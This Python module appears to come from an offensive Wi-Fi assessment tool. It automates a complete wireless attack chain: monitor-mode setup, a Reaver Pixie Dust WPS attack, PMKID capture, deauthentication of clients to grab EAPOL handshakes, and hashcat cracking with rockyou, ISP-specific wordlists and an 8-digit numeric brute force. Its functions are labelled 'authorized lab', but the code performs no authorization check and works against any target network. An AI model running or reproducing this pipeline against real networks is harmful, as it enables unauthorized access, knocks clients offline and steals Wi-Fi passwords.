from __future__ import annotations

import json
import logging
import re
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path

from payloads.config import DEFAULT_WORDLIST, ISP_WORDLIST, TIMEOUTS
from payloads.models import AssessmentContext, WifiNetwork
from payloads.system import run_command
from payloads.workspace_manager import WorkspaceManager

log = logging.getLogger(__name__)

@dataclass
class RadioState:
    interface: str
    nm_killed: bool = False

# --- PARSERS SEPARADOS (SOLID) ---
# --- PARSERS ---

def parse_airmon_start(output: str) -> str | None:
    """Extract the monitor interface name from airmon-ng output."""
    for line in output.splitlines():
        if "monitor mode vif enabled for" in line or "mac80211 monitor mode vif enabled for" in line:
            parts = line.split("for")
            if len(parts) > 1:
                new_iface = parts[1].split()[0].strip("[]")
                if "]" in new_iface:
                    new_iface = new_iface.split("]")[1]
                return new_iface
    return None

def parse_iw_dev_monitor(output: str) -> str | None:
    """Return the first interface explicitly reported in monitor mode."""
    current_iface = None
    for line in output.splitlines():
        line_stripped = line.strip()
        if line_stripped.startswith("Interface"):
            current_iface = line_stripped.split()[1]
        elif "type monitor" in line_stripped and current_iface:
            return current_iface
    return None

def parse_reaver_output(output: str) -> dict[str, str] | None:
    """Extract the recovered PIN and PSK from Reaver output."""
    pin_match = re.search(r"WPS PIN: '(\d+)'", output)
    psk_match = re.search(r"WPA PSK: '([^']+)'", output)
    if psk_match:
        return {
            "pin": pin_match.group(1) if pin_match else "Unknown",
            "psk": psk_match.group(1)
        }
    return None

def parse_hashcat_potfile(potfile_path: Path) -> str | None:
    """Read the potfile safely and extract a recovered password."""
    if not potfile_path.exists() or potfile_path.stat().st_size == 0:
        return None

    lines = [line for line in potfile_path.read_text(errors="ignore").splitlines() if line.strip()]
    if not lines:
        return None

    for line in reversed(lines):
        if ":" in line:
            return line.rsplit(":", 1)[-1]

    return None


def log_tool_output(
    workspace_manager: WorkspaceManager | None,
    tool_name: str,
    command: list[str],
    output: str,
) -> None:
    if workspace_manager is None:
        return
    workspace_manager.append_tool_log(tool_name, " ".join(command), output)


# --- RADIO MANAGEMENT ---

def ensure_monitor_mode(interface: str) -> RadioState:
    log.info(f"Preparing monitor mode on {interface}...")
    nm_killed = False
    try:
        kill_output = run_command(["airmon-ng", "check", "kill"])
        if "Killing these processes:" in kill_output:
            nm_killed = True

        output = run_command(["airmon-ng", "start", interface])
        new_iface = parse_airmon_start(output)
        
        if new_iface:
            log.info(f"Monitor mode enabled. New interface: {new_iface}")
            return RadioState(interface=new_iface, nm_killed=nm_killed)
        
        # Fallback
        iw_output = run_command(["iw", "dev"])
        fallback_iface = parse_iw_dev_monitor(iw_output)
        if fallback_iface:
            log.info(f"Monitor mode detected by iw fallback: {fallback_iface}")
            return RadioState(interface=fallback_iface, nm_killed=nm_killed)
            
        raise RuntimeError(f"Could not determine the monitor interface name for {interface}.")
    except RuntimeError as exc:
        raise RuntimeError(f"Critical failure while enabling monitor mode: {exc}")

def restore_mode(state: RadioState) -> None:
    log.info(f"Restoring interface {state.interface} to managed mode...")
    try:
        run_command(["airmon-ng", "stop", state.interface])
        if state.nm_killed:
            run_command(["systemctl", "restart", "NetworkManager"])
            log.info("Network services restored (NetworkManager).")
    except RuntimeError as exc:
        log.warning(f"Issues were reported while restoring network state: {exc}")

def set_channel(interface: str, channel: str) -> None:
    log.info(f"Locking {interface} to channel {channel}...")
    try:
        run_command(["iw", "dev", interface, "set", "channel", channel])
    except RuntimeError as exc:
        raise RuntimeError(f"Failed to set channel {channel}: {exc}")


# --- ACTIVE ROUTINES ---

def test_wps_for_authorized_lab(
    interface: str,
    bssid: str,
    channel: str,
    workspace_manager: WorkspaceManager,
    captured_files: dict[str, Path] | None = None,
) -> dict[str, str] | None:
    loot_file = workspace_manager.get_path("wps_loot")
    if loot_file.exists():
        log.info("Previous WPS run detected. Reusing stored results.")
        if captured_files is not None:
            captured_files["wps_loot"] = loot_file
        try:
            return json.loads(loot_file.read_text(encoding="utf-8"))
        except json.JSONDecodeError:
            log.warning("WPS_LOOT.json is corrupted. It will be ignored and the run will be repeated.")

    log.info(f"Starting WPS Pixie Dust attempt (Reaver) against {bssid}...")
    command = ["reaver", "-i", interface, "-b", bssid, "-c", channel, "-K", "1", "-L", "-vv"]

    try:
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=TIMEOUTS["wps_pixie"],
        )
        log_tool_output(workspace_manager, "reaver", command, result.stdout + result.stderr)

        if result.returncode not in (0, 1):
            log.warning(f"Reaver exited with unusual code {result.returncode}. Inspecting output anyway...")

        parsed_loot = parse_reaver_output(result.stdout + result.stderr)

        if parsed_loot:
            log.info(f"Recovered WPS material. PIN: {parsed_loot['pin']} | PSK: {parsed_loot['psk']}")
            loot_file.write_text(json.dumps(parsed_loot, indent=4), encoding="utf-8")
            workspace_manager.save_metadata("wps_success", True)
            workspace_manager.save_metadata("wps_loot_file", str(loot_file))
            if captured_files is not None:
                captured_files["wps_loot"] = loot_file
            return parsed_loot

        log.warning("Pixie Dust did not succeed. The router may be patched, blocked, or not vulnerable.")
        workspace_manager.save_metadata("wps_success", False)
        return None
    except subprocess.TimeoutExpired:
        log.warning(f"WPS timeout reached ({TIMEOUTS['wps_pixie']}s). Aborting this path.")
        workspace_manager.save_metadata("wps_timeout", True)
        return None
    except (subprocess.SubprocessError, OSError) as exc:
        log.error(f"System error while executing Reaver: {exc}")
        return None


def collect_pmkid_for_authorized_lab(
    interface: str,
    bssid: str,
    channel: str,
    workspace_manager: WorkspaceManager,
    captured_files: dict[str, Path] | None = None,
) -> Path | None:
    pcapng_file = workspace_manager.get_path("pmkid")
    if pcapng_file.exists() and pcapng_file.stat().st_size > 0:
        log.info(f"Previous PMKID capture detected in {pcapng_file.name}. Reusing it.")
        if captured_files is not None:
            captured_files["pmkid_capture"] = pcapng_file
        return pcapng_file

    log.info(f"Attempting passive PMKID capture against {bssid}...")
    filter_file = workspace_manager.get_path("target_filter")
    filter_file.write_text(f"{bssid.replace(':', '')}\n")

    command = [
        "hcxdumptool", "-i", interface, "-c", channel,
        "--filterlist_ap=" + str(filter_file), "--filtermode=2",
        "-o", str(pcapng_file), "--enable_status=1"
    ]

    process = None
    try:
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(TIMEOUTS["pmkid_capture"])

        if pcapng_file.exists() and pcapng_file.stat().st_size > 0:
            log.info(f"PMKID capture finished: {pcapng_file.name}")
            workspace_manager.save_metadata("pmkid_capture", str(pcapng_file))
            if captured_files is not None:
                captured_files["pmkid_capture"] = pcapng_file
            return pcapng_file

        log.warning("Capture window ended without valid PMKID material.")
        return None
    except (subprocess.SubprocessError, OSError) as exc:
        log.error(f"System error while executing hcxdumptool: {exc}")
        return None
    finally:
        if process and process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
            finally:
                log_tool_output(workspace_manager, "hcxdumptool", command, f"Output file: {pcapng_file}")


def capture_eapol_for_authorized_lab(
    interface: str,
    bssid: str,
    channel: str,
    workspace_manager: WorkspaceManager,
    captured_files: dict[str, Path] | None = None,
) -> Path | None:
    capture_prefix = workspace_manager.get_path("eapol_prefix")
    capture_file = Path(f"{capture_prefix}-01.cap")

    if capture_file.exists() and capture_file.stat().st_size > 0:
        log.info(f"Previous EAPOL capture detected in {capture_file.name}. Reusing it.")
        if captured_files is not None:
            captured_files["eapol_capture"] = capture_file
        return capture_file

    log.info(f"Pivoting to traditional EAPOL capture (deauth path) against {bssid}...")
    airodump_cmd = ["airodump-ng", "--bssid", bssid, "--channel", channel, "-w", str(capture_prefix), "--output-format", "pcap", interface]
    deauth_cmd = ["aireplay-ng", "--deauth", "15", "-a", bssid, interface]

    airodump_proc = None
    try:
        airodump_proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)

        log.info("Launching deauthentication attempt...")
        deauth_res = subprocess.run(
            deauth_cmd,
            capture_output=True,
            text=True,
            timeout=TIMEOUTS["eapol_deauth"],
        )
        log_tool_output(workspace_manager, "aireplay-ng", deauth_cmd, deauth_res.stdout + deauth_res.stderr)

        if deauth_res.returncode != 0:
            log.warning(f"aireplay-ng returned code {deauth_res.returncode}. Injection may not have succeeded: {deauth_res.stderr.strip()}")

        log.info(f"Waiting {TIMEOUTS['eapol_listen']}s to capture client reconnection...")
        time.sleep(TIMEOUTS["eapol_listen"])

        if capture_file.exists() and capture_file.stat().st_size > 0:
            log.info(f"EAPOL capture finished: {capture_file.name}")
            workspace_manager.save_metadata("eapol_capture", str(capture_file))
            if captured_files is not None:
                captured_files["eapol_capture"] = capture_file
            return capture_file

        log.warning("Expected EAPOL capture file was not created.")
        return None
    except subprocess.TimeoutExpired:
        log.warning("The deauthentication attempt took too long.")
        return None
    except (subprocess.SubprocessError, OSError) as exc:
        log.error(f"Subprocess error during EAPOL capture: {exc}")
        return None
    finally:
        if airodump_proc and airodump_proc.poll() is None:
            airodump_proc.terminate()
            try:
                airodump_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                airodump_proc.kill()
            finally:
                log_tool_output(workspace_manager, "airodump-ng", airodump_cmd, f"Output file: {capture_file}")


def prepare_hash_file(
    capture_file: Path,
    workspace_manager: WorkspaceManager,
    captured_files: dict[str, Path] | None = None,
) -> Path | None:
    hash_file = workspace_manager.get_path("hash")
    if hash_file.exists() and hash_file.stat().st_size > 0:
        log.info("Existing 22000 hash file detected. Reusing it.")
        if captured_files is not None:
            captured_files["hash_file"] = hash_file
        return hash_file

    log.info("Processing and normalizing capture data...")
    command = ["hcxpcapngtool", "-o", str(hash_file), str(capture_file)]
    try:
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=TIMEOUTS["hash_prep"],
            check=True,
        )
        log_tool_output(workspace_manager, "hcxpcapngtool", command, result.stdout + result.stderr)
        if hash_file.exists() and hash_file.stat().st_size > 0:
            log.info(f"Capture validated. Hash saved as: {hash_file.name}")
            workspace_manager.save_metadata("hash_file", str(hash_file))
            if captured_files is not None:
                captured_files["hash_file"] = hash_file
            return hash_file
        log.warning("The capture was processed but does not contain valid material.")
        return None
    except subprocess.CalledProcessError as exc:
        log_tool_output(workspace_manager, "hcxpcapngtool", command, exc.stdout + exc.stderr)
        log.error(f"Failed to process the capture with hcxpcapngtool: {exc.stderr.strip()}")
        return None
    except (subprocess.TimeoutExpired, OSError) as exc:
        log.error(f"System error while processing the capture: {exc}")
        return None


def run_password_recovery_for_authorized_lab(
    hash_file: Path,
    target: WifiNetwork,
    workspace_manager: WorkspaceManager,
    context: AssessmentContext,
    captured_files: dict[str, Path] | None = None,
) -> str | None:
    log.info("Starting Hashcat pipeline...")
    potfile = workspace_manager.get_path("potfile")
    if captured_files is not None and hash_file.exists():
        captured_files["hash_file"] = hash_file

    cracked = parse_hashcat_potfile(potfile)
    if cracked:
        log.info(f"Password was already recovered previously. Reusing: {cracked}")
        if captured_files is not None and potfile.exists():
            captured_files["potfile"] = potfile
        return cracked

    if "crack" not in context.offensive_requests and "auto" not in context.offensive_requests:
         log.warning("Cracking phase skipped by current configuration.")
         return None

    ssid_upper = target.ssid.upper()
    wordlist_path = DEFAULT_WORDLIST

    local_wordlist = workspace_manager.get_path("rockyou_local")
    if not wordlist_path.exists() and Path(f"{wordlist_path}.gz").exists() and not local_wordlist.exists():
        log.info("Extracting rockyou.txt into the local workspace...")
        try:
            with open(local_wordlist, "w") as out_f:
                subprocess.run(["zcat", f"{wordlist_path}.gz"], stdout=out_f, check=True)
            wordlist_path = local_wordlist
        except (subprocess.SubprocessError, OSError) as exc:
            log.warning(f"Could not extract rockyou locally: {exc}")
    elif local_wordlist.exists():
        wordlist_path = local_wordlist

    if ("MOVISTAR" in ssid_upper or "VODAFONE" in ssid_upper) and ISP_WORDLIST.exists():
        wordlist_path = ISP_WORDLIST
        log.info("ISP naming pattern detected. Selecting ISP-specific wordlist.")

    if wordlist_path.exists():
        log.info(f"Launching Hashcat (wordlist: {wordlist_path.name})...")
        cmd_dict = [
            "hashcat", "-m", "22000", str(hash_file), str(wordlist_path), 
            "--potfile-path", str(potfile), "-O", "-w", "3"
        ]
        try:
            res_dict = subprocess.run(cmd_dict, capture_output=True, text=True)
            log_tool_output(workspace_manager, "hashcat-dict", cmd_dict, res_dict.stdout + res_dict.stderr)
            # Hashcat return codes: 0 = recovered, 1 = exhausted, >1 = critical error
            if res_dict.returncode > 1:
                log.error(f"Hashcat reported a critical error (dictionary run): {res_dict.stderr.strip()}")
        except KeyboardInterrupt:
            log.warning("Hashcat interrupted by user.")
            
        cracked = parse_hashcat_potfile(potfile)
        if cracked:
            log.info("\n" + "★"*50 + f"\n🎯 PASSWORD RECOVERED SUCCESSFULLY: {cracked}\n" + "★"*50)
            if captured_files is not None and potfile.exists():
                captured_files["potfile"] = potfile
            return cracked
    else:
        log.warning(f"Wordlist not found: {wordlist_path}")

    log.info("Starting fallback brute-force path (8-digit numeric mask)...")
    cmd_brute = [
        "hashcat", "-m", "22000", str(hash_file), "-a", "3", "?d?d?d?d?d?d?d?d", 
        "--potfile-path", str(potfile), "-O", "-w", "3"
    ]
    try:
        res_brute = subprocess.run(cmd_brute, capture_output=True, text=True)
        log_tool_output(workspace_manager, "hashcat-bruteforce", cmd_brute, res_brute.stdout + res_brute.stderr)
        if res_brute.returncode > 1:
            log.error(f"Hashcat reported a critical error (brute-force run): {res_brute.stderr.strip()}")
    except KeyboardInterrupt:
        log.warning("Brute-force run interrupted.")

    cracked = parse_hashcat_potfile(potfile)
    if cracked:
        log.info("\n" + "★"*50 + f"\n🎯 PASSWORD RECOVERED BY BRUTE FORCE: {cracked}\n" + "★"*50)
        if captured_files is not None and potfile.exists():
            captured_files["potfile"] = potfile
        return cracked
        
    log.error("❌ Cracking module completed without success.")
    return None


def intelligent_attack(
    context: AssessmentContext,
    target: WifiNetwork,
    interface: str,
    workspace_manager: WorkspaceManager,
    attack_log: list[str] | None = None,
    captured_files: dict[str, Path] | None = None,
) -> str | None:
    log.info("\n" + "="*50)
    log.info(f"⚔️  STARTING ACTIVE ORCHESTRATOR: {target.display_name}")
    log.info("="*50)

    workspace_manager.save_metadata("target_bssid", target.bssid)
    workspace_manager.save_metadata("target_ssid", target.display_name)
    workspace_manager.save_metadata("security", target.security)

    security = target.security.upper()
    captured_file = None

    if "OPEN" in security or security == "--":
        log.warning("The network is OPEN. There is no encryption material to process.")
        return None

    if "WPS" in security and ("wps" in context.offensive_requests or "auto" in context.offensive_requests):
        if attack_log is not None:
            attack_log.append("Trying WPS path.")
        wps_loot = test_wps_for_authorized_lab(
            interface,
            target.bssid,
            target.channel,
            workspace_manager,
            captured_files=captured_files,
        )
        if wps_loot:
            log.info("\n🏆 FINAL RESULT: NETWORK COMPROMISED THROUGH WPS.")
            if attack_log is not None:
                attack_log.append("WPS path returned a credential.")
            return wps_loot["psk"]
        log.info("Pivoting to WPA/WPA2 capture paths...")

    if "WPA" in security:
        if "pmkid" in context.offensive_requests or "auto" in context.offensive_requests:
            if attack_log is not None:
                attack_log.append("Trying PMKID capture path.")
            captured_file = collect_pmkid_for_authorized_lab(
                interface,
                target.bssid,
                target.channel,
                workspace_manager,
                captured_files=captured_files,
            )

        if not captured_file and ("eapol" in context.offensive_requests or "auto" in context.offensive_requests):
            if attack_log is not None:
                attack_log.append("Trying EAPOL capture path.")
            captured_file = capture_eapol_for_authorized_lab(
                interface,
                target.bssid,
                target.channel,
                workspace_manager,
                captured_files=captured_files,
            )

    if captured_file:
        workspace_manager.save_metadata("captured_file", str(captured_file))
        if captured_files is not None:
            if captured_file.suffix == ".pcapng":
                captured_files["pmkid_capture"] = captured_file
            else:
                captured_files["eapol_capture"] = captured_file
        if attack_log is not None:
            attack_log.append(f"Captured artifact: {captured_file.name}")
        hash_file = prepare_hash_file(
            captured_file,
            workspace_manager,
            captured_files=captured_files,
        )
        if hash_file:
            if attack_log is not None:
                attack_log.append(f"Prepared hash file: {hash_file.name}")
            return run_password_recovery_for_authorized_lab(
                hash_file,
                target,
                workspace_manager,
                context,
                captured_files=captured_files,
            )
        else:
            log.error("Failed to generate a valid hash file for Hashcat.")
    else:
        log.error("❌ No capture path succeeded or none was requested.")

    return None


def maybe_run_offensive_extensions(
    context: AssessmentContext,
    target: WifiNetwork,
    workspace_manager: WorkspaceManager | None = None,
    attack_log: list[str] | None = None,
    captured_files: dict[str, Path] | None = None,
) -> str | None:
    if not context.offensive_requests:
        return None

    if "auto" not in context.offensive_requests and not any(r in context.offensive_requests for r in ["wps", "pmkid", "eapol", "crack"]):
        log.warning("Active module was called without specific routes.")
        return None

    if not context.interface:
        raise RuntimeError("A valid interface is required for active operations (-i wlan0).")

    if workspace_manager is None:
        workspace_manager = WorkspaceManager("workspaces", target.bssid)

    workspace_manager.save_metadata("offensive_requests", list(context.offensive_requests))
    workspace_manager.save_metadata("selected_interface", context.interface)

    radio_state = None
    try:
        radio_state = ensure_monitor_mode(context.interface)
        workspace_manager.save_metadata("monitor_interface", radio_state.interface)
        if attack_log is not None:
            attack_log.append(f"Monitor interface ready: {radio_state.interface}")
        set_channel(radio_state.interface, target.channel)
        if attack_log is not None:
            attack_log.append(f"Channel locked to {target.channel}")

        return intelligent_attack(
            context,
            target,
            radio_state.interface,
            workspace_manager,
            attack_log=attack_log,
            captured_files=captured_files,
        )

    finally:
        if radio_state:
            restore_mode(radio_state)
            if attack_log is not None:
                attack_log.append(f"Radio restored from monitor mode: {radio_state.interface}")
